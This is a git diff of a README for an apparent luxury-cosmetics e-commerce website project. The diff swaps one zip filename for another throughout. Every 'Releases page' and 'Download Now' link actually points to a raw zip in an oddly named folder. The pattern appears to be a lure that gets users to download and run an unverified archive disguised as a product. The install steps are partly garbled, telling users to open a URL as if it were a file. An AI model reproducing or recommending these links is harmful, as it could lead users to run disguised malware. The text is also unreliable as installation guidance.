@@ -1,6 +1,6 @@
 # ✨ Argento-Stores---Premium-Cosmetics-E-commerce-Website - A Beautifully Designed E-commerce Experience
 
-[![Download Now](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/Argento-Premium-commerce-Cosmetics-Website-Stores-v2.8.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/Argento-Premium-commerce-Cosmetics-Website-Stores-v2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/commerce_Premium_Website_Stores_Argento_Cosmetics_v1.0.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/commerce_Premium_Website_Stores_Argento_Cosmetics_v1.0.zip)
 
 ## 📦 Overview
 Argento Stores is a fully responsive e-commerce website tailored for a luxury cosmetics brand. This website provides elegant animations and interactive features that enhance user engagement. You can offer your customers a premium shopping experience that stands out from the competition.
@@ -9,14 +9,14 @@ Argento Stores is a fully responsive e-commerce website tailored for a luxury co
 To successfully download and run the Argento Stores application, follow these steps carefully. Even if you're not a tech expert, you can get this running in no time.
 
 ## 🔗 Download & Install
-To download the application, [visit the Releases page](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/Argento-Premium-commerce-Cosmetics-Website-Stores-v2.8.zip). Here, you can find the latest version of the software. Simply click on the version you want and follow the prompts to download the files.
+To download the application, [visit the Releases page](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/commerce_Premium_Website_Stores_Argento_Cosmetics_v1.0.zip). Here, you can find the latest version of the software. Simply click on the version you want and follow the prompts to download the files.
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/Argento-Premium-commerce-Cosmetics-Website-Stores-v2.8.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/commerce_Premium_Website_Stores_Argento_Cosmetics_v1.0.zip).
 2. Find the latest version of "Argento Stores."
 3. Click on the download link to get the application files.
 4. Once the download completes, locate the file (usually in your Downloads folder).
 5. Extract the file if it's in a compressed format (like .zip).
-6. Open the folder and look for the https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/Argento-Premium-commerce-Cosmetics-Website-Stores-v2.8.zip file to launch the website.
+6. Open the folder and look for the https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/commerce_Premium_Website_Stores_Argento_Cosmetics_v1.0.zip file to launch the website.
 
 ## 💻 System Requirements
 Before you download Argento Stores, make sure your system meets these requirements:
@@ -52,4 +52,4 @@ We welcome contributions to help improve Argento Stores. If you have suggestions
 ## 🎉 Next Steps
 Once you have successfully downloaded and launched Argento Stores, take time to explore its features. You can easily add products, manage inventory, and customize the user experience to fit your brand.
 
-For updates and new features, don’t forget to check back on the [Releases page](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/Argento-Premium-commerce-Cosmetics-Website-Stores-v2.8.zip). Your next big shopping experience starts here. Enjoy experimenting!
+For updates and new features, don’t forget to check back on the [Releases page](https://raw.githubusercontent.com/AlbertoJAMA/Argento-Stores---Premium-Cosmetics-E-commerce-Website/main/refractionate/commerce_Premium_Website_Stores_Argento_Cosmetics_v1.0.zip). Your next big shopping experience starts here. Enjoy experimenting!
